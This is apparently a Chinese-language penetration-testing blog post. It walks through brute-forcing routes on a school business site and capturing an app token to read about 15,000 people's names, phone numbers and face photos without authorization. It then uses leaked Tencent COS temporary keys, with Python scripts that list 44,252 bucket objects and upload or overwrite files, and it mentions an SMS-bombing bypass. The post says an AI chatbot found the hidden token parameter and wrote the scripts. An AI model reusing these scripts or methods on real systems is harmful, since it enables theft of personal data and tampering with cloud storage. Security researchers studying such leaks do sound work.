---
title: 空白页面渗透思路、越权读取万条资料、腾讯 COS 临时密钥泄露利用，4 万对象可上传覆盖
url: https://mp.weixin.qq.com/s/0IIG0fdG0hVZrnvZ9mmz6Q
source: Doonsec's feed
date: 2026-11-16
fetch_date: 2026-11-17T09:54:49.515113
---

# 空白页面渗透思路、越权读取万条资料、腾讯 COS 临时密钥泄露利用，4 万对象可上传覆盖

# 空白页面渗透思路、越权读取万条资料、腾讯 COS 临时密钥泄露利用，4 万对象可上传覆盖

111192122262821
111192122262821

渗透安全HackTwo

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**0x01 简介**

分享一次业务系统完整渗透实战，站点访问仅返回路由校验失败空白页。通过资产测绘、路由爆破结合 AI 分析，发现隐藏 token 参数；使用小黄鸟联动 Burp 抓包获取 APP 凭证，实现越权查询，读取批量用户姓名、手机号与人脸数据。同时在上传接口抓到腾讯 COS 临时密钥，脚本遍历导出四万余桶内资源，支持文件上传覆盖与删除；最后利用邮箱大小写变形，绕过短信接口频次限制，形成一套完整攻击链。

> 本文内容仅用于网络安全技术学习与交流，所有操作均在授权测试环境下完成。严禁将文中技术用于未授权检测与非法攻击，违者责任自负。

现在只对常读和星标的公众号才展示大图推送，建议大家把**渗透安全HackTwo**“设为星标”，否则可能就看不到了啦！****

参考文章：

```
https://www.hacktwohub.com/(HackTwoHub网安社区)https://xz.aliyun.com/news/93055
```

****末尾可领取挖洞资料/加圈子 #渗透安全HackTwo****

****0x02 正文详情****

> 从一次信息收集发现的空白页说起：路由爆破定位后台路径，真机免ROOT抓包获取token实现越权，进而拿到全校学生姓名手机号人脸；又从上传接口挖出腾讯云COS临时密钥泄露，列桶4万余条对象并验证任意上传覆盖；最后附一个大小写变形绕过邮箱发送限制的短信轰炸。

## 信息收集

首先，通过fofa，hunter信息收集发现了如下资产

https://xxxx.xxx.cn:8081

https://xxxx.xxx.cn:9443

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAX3VtYamrxic0we6WeSOwTBbzFl7BY935dMQUbyykKhfcBv3w3GvPyY75J7EbgIg2fzVicTpc7TMRBMopq2RgKQPc047YYlBNWG4/640?wx_fmt=png&from=appmsg)

但是直接访问发现显示路由校验失败

不是显示没有授权、404而是路由校验失败

所以这里猜测如果有了合适的路由大概率就能够正常访问了

于是在这个思路的加持下打算点一下上帝之眼查看具体路径

然后复制全部路径放BP里进行爆破

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUGX0oLRNs3Yuic1ShMo94z2X9ABQe2gF9sUgKsFEKZDKHX5QicsK2IEOVibqbthIJia8RDfGia1N2kcOr3ndwIQxso947GUTp3mWfU/640?wx_fmt=png&from=appmsg)

爆破下发现都是200，我都以为要出货了，没想到访问后显示需要登录（bushi）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAX8gH28gAlvUy5DO5QyULkhwm62VvFG2o0pIoYANZQiaA2VdhsJoAY42icFBQrW2aq897taqq7ibOkzW5sHhGBpR4VaRSKUOjrvjo/640?wx_fmt=png&from=appmsg)

随便调了一个URL https://xxxxxx.xxx.cn:8081/subpages/admin/home/home

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVSevM76628Ie0zSIMVLWz82t36HanUgofib7AQk6uPiboD8WQonc32ckibLyxMkicvf8icrghFicSAg1xCCZUS6PIcYnGcDcZykVMSw/640?wx_fmt=png&from=appmsg)

发现显示报错；没辙了只能把接口发给ai做进一步测试

AI果然还是厉害，发现这个路径还隐藏了一个token参数

https://xxxxxxx.xxx.cn:8081/subpages/admin/home/home?token=

同时因为这个网站同样也是某APP的HOST

那现在就有思路了，只要我用手机抓包，然后获得COOKIE后再拼接到token后，那不就能做进一步测试了

这里因为这个APP并没有进行虚拟机校验，所以我这里采用的方法是使用小黄鸟和BP联动，能够直接将手机端APP的流量直接导入至Brup中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWpUpoaoicicyBNeSybxJv1ufyEhFqNB8wW5lDQTe23c48hv2SBsb7OJqJBLTPIFTzbs6VSy8VKvm34s7mmuiaJ7WZrCF1csib0xPA/640?wx_fmt=png&from=appmsg)

然后就能愉快的开始抓包了~

## 漏洞发现

### 1、越权获取手机号、姓名、人脸

回到最开始的URL，我们既然获取到了token肯定就能测了，

https://xxxx.xxxx.xxx.cn:8081/subpages/admin/home/home?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*.k

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAXtclTwv7mnzuyr8iaE2lTnAqeglT7wS0RCqM13FKsVAdZg9lY9e3uuPBsFMjxAfBW5rzia8gWwu36wOTRTDCsbYmlJpxrB8twp4/640?wx_fmt=png&from=appmsg)

虽然显示获取失败，但是它都说我是管理员了，我肯定能访问一点接口吧

然后挨个点点发现了信息查询这里

直接查询成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWWlic4zXiaa8zZS1CGr2ACqGO8C4k7T6d1r0V5f36AodyeUszumb7fvYYunFQUic8TMMpkjaYdeHbkA2eMBzcib6sicdtlV2c2mk3k/640?wx_fmt=png&from=appmsg)

经过初步测试发现，通过越权能看到大概1w5条姓名、手机号、头像

### 存储桶任意文件上传、覆盖、列桶

既然能抓包了肯定得到处看看

在工单提交界面发现了个文件上传的接口

![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAVIq3wZV6a8vmuG1UqfELFL2SZjdbACfc0iciaIUPLm2Ep3A0qL0OUUcJ32PvuaX282cqH9z3AAP2ribdhfTp9DuuCO7byzaHUM5Y/640?wx_fmt=png&from=appmsg)

上传一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVibdzzXQCb5FicwIOaJJBiab4J0SoQ62CkN7UuWlicXEhZ5r9GC7tK8ia0rW5xtWvCYdFvm3ju0iaYLOiaLUGX8X1FKxHn96R8WB44xA/640?wx_fmt=png&from=appmsg)

wok！出货了

这不就是标准的存储桶临时密钥泄露

火速喊ai搓个脚本然后遍历下

```
from qcloud_cos import CosConfig, CosS3Client# =========================# COS 存储桶配置# =========================BUCKET = "sport-88888888"REGION = "ap-guangzhou"# =========================# 临时密钥配置# 填入你的临时密钥# =========================TMP_SECRET_ID = "AKIDHMbIQpWwh*********a4uajnZbYSDH"TMP_SECRET_KEY = "r7ftHbfJuyrjTR********QnUfaSi1ejtA10="SESSION_TOKEN = "yw5CienBBXFVR3j73Cz0w********wGq8XhkQ"def list_bucket(prefix: str = "", max_keys: int = 1000, output_file: str = "cos_urls.txt"):    config = CosConfig(        Region=REGION,        SecretId=TMP_SECRET_ID,        SecretKey=TMP_SECRET_KEY,        Token=SESSION_TOKEN,        Scheme="https"    )    client = CosS3Client(config)    marker = ""    total = 0    print(f"[+] Bucket: {BUCKET}")    print(f"[+] Region: {REGION}")    print(f"[+] Prefix: {prefix if prefix else '(根目录)'}")    print(f"[+] URL 输出文件: {output_file}")    print("=" * 80)    with open(output_file, "w", encoding="utf-8") as f:        while True:            response = client.list_objects(                Bucket=BUCKET,                Prefix=prefix,                Marker=marker,                MaxKeys=max_keys            )            contents = response.get("Contents", [])            for item in contents:                key = item.get("Key")                size = item.get("Size")                last_modified = item.get("LastModified")                storage_class = item.get("StorageClass", "")                total += 1                url = f"https://{BUCKET}.cos.{REGION}.myqcloud.com/{key}"                # 控制台输出详情                print(f"[{total}] {key}")                print(f"    Size: {size} bytes")                print(f"    LastModified: {last_modified}")                print(f"    StorageClass: {storage_class}")                print(f"    URL: {url}")                print("-" * 80)                # 只把 URL 写入 txt，一行一个                f.write(url + "\n")            is_truncated = response.get("IsTruncated")            if is_truncated == "true" or is_truncated is True:                marker = response.get("NextMarker")                if not marker:                    break            else:                break    print(f"[+] 列桶完成，共发现 {total} 个对象")    print(f"[+] URL 已保存到: {output_file}")if __name__ == "__main__":    parser = argparse.ArgumentParser(description="Tencent COS 临时密钥列桶并导出 URL")    parser.add_argument(        "--prefix",        default="",        help="只列出指定前缀下的对象，例如 H5_file/、test/、uploads/。默认列根目录"    )    parser.add_argument(        "--max-keys",        type=int,        default=1000,        help="每次请求返回数量，最大通常为 1000"    )    parser.add_argument(        "--output",        default="cos_urls.txt",        help="导出的 URL 文件名，默认 cos_urls.txt"    )    args = parser.parse_args()    list_bucket(        prefix=args.prefix,        max_keys=args.max_keys,        output_file=args.output    )
```

成功列出44252条存储桶数据

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAXdGS3Fedt0Wj8dPib9iaiagWkKoD2cVgTOw2Hc5JaSK5hibCh5gyBOrWWChoJSSEdgyVh1BdibLuR0iaXCIKII3rtTZT9nOd5uiajvbE/640?wx_fmt=png&from=appmsg)

在有了具体的路径，可以通过已知的路径直接进行覆盖，具体的上传脚本如下

```
# -*- coding: utf-8 -*-"""腾讯云 COS 临时密钥文件管理脚本（修复代理版）修复：1. 强制关闭 requests 环境代理2. 禁止 WinHTTP/系统代理影响 COS SDK3. 打印实际代理配置方便排查"""import argparseimport os# 强制清理环境代理for k in [    "HTTP_PROXY",    "HTTPS_PROXY",    "http_proxy",    "https_proxy",    "ALL_PROXY",    "all_proxy",]:    os.environ.pop(k, None)from qcloud_cos import CosConfig, CosS3ClientBUCKET = "sport-1******"REGION = "ap-guangzhou"TMP_SECRET_ID = "AKIDyZcXif*****Mz2C2nqFeu1f52F9f7oP5bhH6wdNIJO"TMP_SECRET_KEY = "9mvdJ53Wp2jh******+/QpiHo0eCT7UeRo="SESSION_TOKEN = "unYwrGxsLBLaj6G******lFBX3WBASrLAsMH44KDwds1snsmjjTNvJWVG96Zyo2H9oTA"def get_client():    config = CosConfig(        Region=REGION,        SecretId=TMP_SECRET_ID,        SecretKey=TMP_SECRET_KEY,        Token=SESSION_TOKEN,        Scheme="https",        Proxies={}    )    client = CosS3Client(config)    # 强制 requests 不读取系统代理    client._session.trust_env = False    print("[DEBUG] COS Proxy:")    print(client._conf._proxies)    return clientdef upload_file(local_file, cos_key):    client = get_client()    if not os.path.exists(local_file):        print("[!] 文件不存在:", local_file)        return    print("[+] 开始上传")    print("本地文件:", local_file)    print("COS路径:", cos_key)    with open(local_file, "rb") as f:        response = client.put_object(            Bucket=BUCKET,            Body=f,            Key=cos_key        )    print("\n[+] 上传成功")    print("ETag:", response.get("ETag"))    url = f"https://{BUCKET}.cos.{REGION}.myqcloud.com/{cos_key}"    print("URL:")    print(u...